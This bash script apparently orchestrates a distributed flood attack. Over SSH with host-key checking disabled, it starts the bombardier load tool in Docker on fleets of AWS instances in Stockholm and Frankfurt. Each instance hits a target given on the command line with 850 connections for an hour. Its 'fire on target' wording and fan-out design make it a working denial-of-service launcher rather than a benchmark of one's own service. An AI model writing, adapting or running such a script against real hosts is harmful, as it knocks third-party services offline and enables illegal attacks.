#!/bin/bash

# Fill the list of IPs of online AWS instances, e.g.:
# STOCKHOLM=('1.2.3.4' '5.6.7.8' '9.10.11.12')
# FRANKFURT=('1.2.3.4' '5.6.7.8' '9.10.11.12')

STOCKHOLM=()
FRANKFURT=()

main(){
	echo "Stockholm fires on $1"
	fire "key-stockholm-1.pem" ${1} "${STOCKHOLM[@]}"

	echo "Frankfurt fires on $1"
	fire "key-frankfurt-1.pem" ${1} "${FRANKFURT[@]}"
}

fire(){
	local key=${1}
	local target=${2}
	shift 2

	for ip in ${@}
	do
		echo "Fire on ${target} by ${ip}"
		ssh -i "${key}" -o "StrictHostKeyChecking no" "ubuntu@${ip}" screen -dm sudo docker run -ti --rm alpine/bombardier -c 850 -d 3600s -l ${target}
	done
}

if ./checkAWS.sh; then
	main ${@}
else
	echo "AWS CLI not found, check https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html"
fi
